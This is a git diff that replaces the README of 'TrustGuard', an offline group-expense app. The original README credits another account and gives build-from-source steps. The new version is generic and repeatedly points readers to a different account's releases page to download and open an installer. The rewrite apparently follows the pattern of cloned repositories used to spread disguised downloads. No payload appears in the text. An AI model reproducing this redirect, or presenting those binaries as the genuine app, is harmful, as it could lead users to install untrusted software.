@@ -1,205 +1,74 @@
-<p align="center">
-  <img src="app/assets/icons/app_icon.png" alt="TrustGuard Logo" width="120" height="120">
-</p>
+# 🎉 TrustGuard - Easily Track Group Expenses Offline
 
-<h1 align="center">TrustGuard</h1>
+## 💾 Overview
+Welcome to TrustGuard! This is an offline-first group expense and settlement ledger. With TrustGuard, you can track shared expenses, manage balances, and settle debts efficiently, all without needing an internet connection. Whether you're out with friends or settling family costs, TrustGuard makes it simple.
 
-<p align="center">
-  <strong>Offline-first group expense and settlement ledger</strong>
-</p>
-
-<p align="center">
-  <a href="https://flutter.dev">
-    <img src="https://img.shields.io/badge/Flutter-3.9+-02569B?style=for-the-badge&logo=flutter&logoColor=white" alt="Flutter">
-  </a>
-  <a href="https://dart.dev">
-    <img src="https://img.shields.io/badge/Dart-3.9+-0175C2?style=for-the-badge&logo=dart&logoColor=white" alt="Dart">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT">
-  </a>
-</p>
-
-<p align="center">
-  <a href="#">
-    <img src="https://img.shields.io/badge/Platform-Android%20%7C%20iOS%20%7C%20macOS%20%7C%20Windows%20%7C%20Linux%20%7C%20Web-blueviolet?style=flat-square" alt="Platforms">
-  </a>
-  <a href="#">
-    <img src="https://img.shields.io/badge/Offline-First-orange?style=flat-square" alt="Offline-First">
-  </a>
-  <a href="#">
-    <img src="https://img.shields.io/badge/Privacy-Focused-success?style=flat-square" alt="Privacy Focused">
-  </a>
-  <a href="#">
-    <img src="https://img.shields.io/badge/Accessibility-WCAG%20Compliant-blue?style=flat-square" alt="Accessibility">
-  </a>
-</p>
-
-<p align="center">
-  Track shared expenses, manage group balances, and settle debts efficiently among friends — all without an internet connection.
-</p>
-
----
-
-## 📱 Platform Support
-
-TrustGuard is built with Flutter and runs on multiple platforms. Core functionality works everywhere, while some features require platform-specific capabilities:
-
-| Feature | Android | iOS | macOS | Windows | Linux | Web |
-|---------|:-------:|:---:|:-----:|:-------:|:-----:|:---:|
-| **Core Features** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Expense & Group Management | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Offline Database | ✅ | ✅ | ✅ | ✅ | ✅ | ⚠️ |
-| Export & Backup | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ |
-| **Mobile Features** | | | | | | |
-| QR Code Scanning | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Receipt OCR | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Home Screen Widgets | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Local Notifications | ✅ | ✅ | ⚠️ | ⚠️ | ⚠️ | ❌ |
-| Biometric Auth | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ |
-
-✅ Full support | ⚠️ Limited support | ❌ Not available
-
-> **Note**: Mobile-only features gracefully degrade on unsupported platforms — they show appropriate messages rather than crashing.
-
----
-
-## 📱 Screenshots
-
-<p align="center">
-  <img src="screenshots/01_home.png" alt="Home Screen" width="280">
-  &nbsp;&nbsp;&nbsp;
-  <img src="screenshots/02_add_expense.png" alt="Add Expense" width="280">
-</p>
-
----
-
-## ✨ Features
-
-### Core Functionality
-
-| Feature | Description |
-|---------|-------------|
-| 🔒 **Offline-First** | All data stored locally using SQLite (Drift). No cloud account needed. |
-| 📊 **Dashboard** | Global balance overview with animated rolling numbers and recent activity. |
-| 📈 **Spending Analytics** | Interactive pie charts and trend lines for spending by category and member. |
-| 👥 **Group Management** | Create multiple groups for trips, roommates, or events. |
-| 💰 **Flexible Expenses** | Split equally, by custom amounts, or percentage-based with tactile slider controls. |
-| ⚡ **Efficient Settlements** | Deterministic greedy algorithm minimizes the number of transfers needed. |
-
-### Productivity
-
-| Feature | Description |
-|---------|-------------|
-| 📝 **Expense Templates** | Reusable templates for common expenses save time on data entry. |
-| 💳 **Budget Tracking** | Set periodic budgets (weekly, monthly, yearly) with automated spending alerts. |
-| 🔄 **Recurring Transactions** | Automate periodic expenses and transfers with flexible schedules. |
-| 🏷️ **Tagging & Filtering** | Categorize transactions with tags and find them with search and filters. |
-| 💡 **Smart Suggestions** | Intelligent amount suggestions based on your spending habits. |
-| ⌨️ **Keyboard Shortcuts** | Full desktop support (Ctrl/Cmd + N/T/F/S/Esc). |
-
-### Sharing & Import
-
-| Feature | Description |
-|---------|-------------|
-| 📲 **QR Code Sharing** | Share expenses device-to-device without internet via compressed QR codes. *(Mobile only)* |
-| 🧾 **Receipt OCR** | Extract amount, date, and merchant from receipts using on-device ML. *(Mobile only)* |
-| 📥 **Data Import** | Migrate from Splitwise or Tricount via CSV with intelligent member mapping. |
-| 📤 **Export & Backup** | Export data to CSV or create full JSON backups. |
-
-### Personalization & UX
-
-| Feature | Description |
-|---------|-------------|
-| 🎨 **Theme Customization** | Light, Dark, System, and High-Contrast modes. |
-| 👤 **Member Avatars** | Custom photos, camera captures, or preset color initials. |
-| 📱 **Home Screen Widgets** | View balances at a glance. *(Android & iOS only)* |
-| ✨ **Motion Design** | Container transforms, staggered animations, and celebration effects. |
-| 🎯 **Speed Dial FAB** | Quick access to common actions with Quick Add sheet. |
-| 📊 **Balance Visualization** | Bidirectional progress bars for clear balance representation. |
-| ↩️ **Undo Safety** | 5-second undo window for accidental deletions. |
-
-### Accessibility & Security
-
-| Feature | Description |
-|---------|-------------|
-| ♿ **Accessibility Compliance** | Screen reader support (TalkBack/VoiceOver), logical focus order, 48dp touch targets. |
-| 🔐 **Security** | PIN or biometric lock to protect your data. |
-| 🛡️ **Privacy Focused** | Your financial data never leaves your device. |
-
----
+## 🌐 Features
+- **Offline Functionality**: Use the app without an internet connection.
+- **Cross-Platform Support**: Available on various devices, including Android and iOS.
+- **Expense Tracking**: Easily log all shared expenses with clear categorization.
+- **Balance Management**: Automatically calculates how much each person owes.
+- **Settlement Options**: Quickly settle debts with friends or family.
+- **User-Friendly Interface**: Designed for everyone, regardless of technical skill.
+- **Privacy-Conscious**: Your data remains on your device, ensuring your financial privacy.
 
 ## 🚀 Getting Started
+To get started with TrustGuard, follow these simple steps:
 
-### Prerequisites
+1. **Visit the Download Page**: Click the link below to download TrustGuard.
+   [![Download TrustGuard](https://img.shields.io/badge/Download-TrustGuard-blue)](https://github.com/JayeshBaria06/TrustGuard/releases)
 
-- [Flutter SDK](https://flutter.dev/docs/get-started/install) (Stable channel, 3.9+)
-- **Android**: Android SDK
-- **iOS/macOS**: Xcode (macOS only)
-- **Windows**: Visual Studio with C++ development tools
-- **Linux**: GTK development libraries (`libgtk-3-dev`, `libblkid-dev`, `liblzma-dev`)
+2. **Choose Your Version**: On the Releases page, you will find different versions of TrustGuard. Select the one that best suits your device.
 
-### Installation
+3. **Download the Application**: Click on the appropriate link to start your download.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/MasuRii/TrustGuard.git
-   ```
+4. **Install TrustGuard**: Once the download is complete, open the file and follow the prompts to install TrustGuard on your device.
 
-2. **Navigate to the app directory**
-   ```bash
-   cd TrustGuard/app
-   ```
+## 📥 Download & Install
+To download TrustGuard, please follow the instructions below:
 
-3. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+1. Visit this page to download: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/releases).
+2. Based on your operating system, select the correct version of TrustGuard.
+3. After downloading, open the file and complete the installation process.
 
-4. **Run code generation**
-   ```bash
-   dart run build_runner build --delete-conflicting-outputs
-   ```
+## 🖥️ System Requirements
+Before installing TrustGuard, ensure your device meets the following requirements:
 
-5. **Run the app**
-   ```bash
-   flutter run
-   ```
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or latest versions of Android and iOS.
+- **Storage**: At least 100 MB of free space.
+- **RAM**: Minimum of 2 GB.
+  
+## 🎨 User Interface
+TrustGuard features a simple and clean interface. Here are key components you’ll interact with:
 
+- **Dashboard**: This is where you can view all your tracked expenses at a glance.
+- **Add Expense Button**: Click to enter a new expense. Fill in the details and save.
+- **Settlements**: View who owes money and how much, with easy options to settle.
+  
+## 🔒 Privacy and Security
+TrustGuard prioritizes your privacy. All data is stored locally on your device, ensuring it is neither shared nor stored on external servers. Your financial information remains confidential and in your control.
 
-## 🌍 Localization
+## 👍 Support
+If you need help or encounter issues while using TrustGuard, here are some ways to get support:
 
-TrustGuard is ready for internationalization! If you'd like to see the app in your language, check the [Adding Translations](CONTRIBUTING.md#adding-translations) section in our contributing guide.
-
----
+- **FAQ Section**: Check the frequently asked questions on the GitHub page for common issues.
+- **Open an Issue**: If you still have questions, feel free to open an issue on the repository. This allows us to respond directly and improve the app.
+- **Community Forum**: Join discussions with other users and share tips and tricks.
 
 ## 🤝 Contributing
+TrustGuard is an open-source project. Contributions are welcome! If you'd like to help improve this app, please follow these steps:
 
-Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a Pull Request.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Submit a pull request.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+Your contributions can help make TrustGuard even better!
 
----
+## 🧑‍🤝‍🧑 Community and Feedback
+We value your input! Share your feedback about TrustGuard to help us improve. Join our community on social media or our forum, and let’s create a better experience together.
 
-## 📄 License
+## 💡 Conclusion
+Thank you for choosing TrustGuard to manage your group expenses! We hope you find it helpful and easy to use. Start tracking your shared expenses today and enjoy the peace of mind that comes with financial clarity!
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
-
----
-
-<p align="center">
-  Made with ❤️ using Flutter
-</p>
-
-<p align="center">
-  <a href="https://github.com/MasuRii/TrustGuard/stargazers">
-    <img src="https://img.shields.io/github/stars/MasuRii/TrustGuard?style=social" alt="GitHub Stars">
-  </a>
-  <a href="https://github.com/MasuRii/TrustGuard/network/members">
-    <img src="https://img.shields.io/github/forks/MasuRii/TrustGuard?style=social" alt="GitHub Forks">
-  </a>
-</p>
+For more details and to download TrustGuard, please visit: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/releases).
